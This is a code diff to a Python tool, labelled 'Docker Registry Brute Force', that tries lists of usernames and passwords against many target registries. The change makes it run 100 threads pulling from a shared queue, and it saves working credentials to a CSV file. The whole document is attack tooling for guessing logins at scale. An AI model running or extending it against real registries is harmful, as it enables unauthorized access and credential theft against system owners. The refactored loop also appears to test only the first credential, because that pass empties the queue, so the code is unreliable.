@@ -4,9 +4,10 @@ import requests, warnings
 from json import dump
 from datetime import date
 from base64 import b64encode
-from optparse import OptionParser
+from argparse import ArgumentParser
+from queue import Queue, Empty
+from threading import Thread, Lock
 from colorama import Fore, Back, Style
-from multiprocessing import Pool, Lock, cpu_count
 from time import strftime, localtime, time
 
 status_color = {
@@ -17,20 +18,29 @@ status_color = {
     ' ': Fore.WHITE
 }
 
-def display(status, data, start='', end='\n'):
-    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)
-
-def get_arguments(*args):
-    parser = OptionParser()
-    for arg in args:
-        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
-    return parser.parse_args()[0]
-
 scheme = "http"
 warnings.filterwarnings('ignore')
 dump_details = False
 lock = Lock()
-thread_count = cpu_count()
+thread_count = 100
+successful_logins = {}
+
+
+def display(status, data, start='', end='\n'):
+    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)
+
+def get_arguments(*args):
+    description = "Docker Registry Brute Force"
+    parser = ArgumentParser(description=description)
+    parser.add_argument('-t', "--target", type=str, required=True, help="Target Servers (Seperated by ',' or File Name)")
+    parser.add_argument('-u', "--users", type=str, help="Target Users (seperated by ',') or File containing List of Users")
+    parser.add_argument('-P', "--password", type=str, help="Passwords (seperated by ',') or File containing List of Passwords")
+    parser.add_argument('-c', "--credentials", type=str, help="Name of File containing Credentials in format ({user}:{password})")
+    parser.add_argument('-d', "--details", type=str, help="JSON File to store details about Docker Registry (Optional)")
+    parser.add_argument('-W', "--threads", type=int, help=f"Threads to Spawn (Default={thread_count})", default=thread_count)
+    parser.add_argument('-T', "--timeout", type=float, help="Timeout for Request", default=None)
+    parser.add_argument('-w', "--write", type=str, help="CSV File to Dump Successful Logins (default=current data and time", default=f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv")
+    return parser.parse_args()
 
 def login(target, username=None, password=None, timeout=None):
     t1 = time()
@@ -52,14 +62,17 @@ def login(target, username=None, password=None, timeout=None):
     except Exception as error:
         t2 = time()
         return (False, t2-t1, None) if "401" in str(error) and "Unauthorized" in str(error) else (error, t2-t1, None)
-def loginHandler(thread_index, targets, credentials, timeout):
-    successful_logins = {}
+def loginHandler(thread_index, queue, credentials, timeout):
     for username, password in credentials:
-        for target in targets:
+        while True:
+            try:
+                target = queue.get_nowait()
+            except Empty:
+                break
             status, time_taken, details = login(target, username, password, timeout)
             if status == True:
-                successful_logins[target] = [username, password, details]
                 with lock:
+                    successful_logins[target] = [username, password, details]
                     display(' ', f"Thread {thread_index+1}:{time_taken:.2f}s -> {Fore.CYAN}{username}{Fore.RESET}:{Fore.GREEN}{password}{Fore.RESET}@{Fore.MAGENTA}{target}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
             elif status == False:
                 with lock:
@@ -67,28 +80,17 @@ def loginHandler(thread_index, targets, credentials, timeout):
             else:
                 with lock:
                     display(' ', f"Thread {thread_index+1}:{time_taken:.2f}s -> {Fore.CYAN}{username}{Fore.RESET}:{Fore.GREEN}{password}{Fore.RESET}@{Fore.MAGENTA}{target}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status}{Fore.RESET}{Back.RESET}")
-    return successful_logins
 
 if __name__ == "__main__":
-    arguments = get_arguments(('-t', "--target", "target", "Target Servers (Seperated by ',' or File Name)"),
-                              ('-u', "--users", "users", "Target Users (seperated by ',') or File containing List of Users"),
-                              ('-P', "--password", "password", "Passwords (seperated by ',') or File containing List of Passwords"),
-                              ('-c', "--credentials", "credentials", "Name of File containing Credentials in format ({user}:{password})"),
-                              ('-d', "--details", "details", "JSON File to store details about Docker Registry (Optional)"),
-                              ('-T', "--timeout", "timeout", "Timeout for Request"),
-                              ('-w', "--write", "write", "CSV File to Dump Successful Logins (default=current data and time)"))
-    if not arguments.target:
-        display('-', f"Please specify {Back.YELLOW}Target Server{Back.RESET}")
+    arguments = get_arguments()
+    try:
+        with open(arguments.target, 'r') as file:
+            arguments.target = [target.strip() for target in file.read().split('\n') if target != '']
+    except FileNotFoundError:
+        arguments.target = arguments.target.split(',')
+    except Exception as error:
+        display('-', f"Error Occured while Reading File {Back.MAGENTA}{arguments.target}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
         exit(0)
-    else:
-        try:
-            with open(arguments.target, 'r') as file:
-                arguments.target = [target.strip() for target in file.read().split('\n') if target != '']
-        except FileNotFoundError:
-            arguments.target = arguments.target.split(',')
-        except Exception as error:
-            display('-', f"Error Occured while Reading File {Back.MAGENTA}{arguments.target}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
-            exit(0)
     if not arguments.credentials:
         if not arguments.users:
             arguments.users, arguments.password = [''], ['']
@@ -130,24 +132,19 @@ if __name__ == "__main__":
             exit(0)
     if arguments.details:
         dump_details = True
-    arguments.timeout = float(arguments.timeout) if arguments.timeout else None
-    if not arguments.write:
-        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
     total_servers = len(arguments.target)
     display('+', f"Total Target Servers = {Back.MAGENTA}{total_servers}{Back.RESET}")
     display('+', f"Total Credentials    = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
     t1 = time()
-    successful_logins = {}
-    pool = Pool(thread_count)
-    server_divisions = [arguments.target[group*total_servers//thread_count: (group+1)*total_servers//thread_count] for group in range(thread_count)]
+    queue = Queue()
+    for target in arguments.target:
+        queue.put(target)
     threads = []
-    display(':', f"Staring {Back.MAGENTA}{thread_count}{Back.RESET} Threads")
-    for index, server_division in enumerate(server_divisions):
-        threads.append(pool.apply_async(loginHandler, (index, server_division, arguments.credentials, arguments.timeout, )))
+    for thread_index in range(thread_count):
+        threads.append(Thread(target=loginHandler, args=(thread_index, queue, arguments.credentials, arguments.timeout, )))
+        threads[-1].start()
     for thread in threads:
-        successful_logins.update(thread.get())
-    pool.close()
-    pool.join()
+        thread.join()
     t2 = time()
     display(':', f"Successful Logins = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
     display(':', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
